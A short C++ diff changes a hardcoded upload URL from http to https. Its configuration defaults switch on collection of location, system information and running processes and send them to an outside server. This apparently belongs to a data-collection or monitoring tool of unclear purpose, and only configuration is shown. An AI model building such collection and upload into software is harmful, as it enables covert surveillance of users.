@@ -27,7 +27,7 @@ int main() {
 
     // Configuration variables with defaults
     std::string user = "west";
-    std::string serverUrl = "http://naif.wtf/api/upload";
+    std::string serverUrl = "https://naif.wtf/api/upload";
     bool collectLocation = true;
     bool collectSystemInfo = true;
     bool collectRunningProcesses = true;
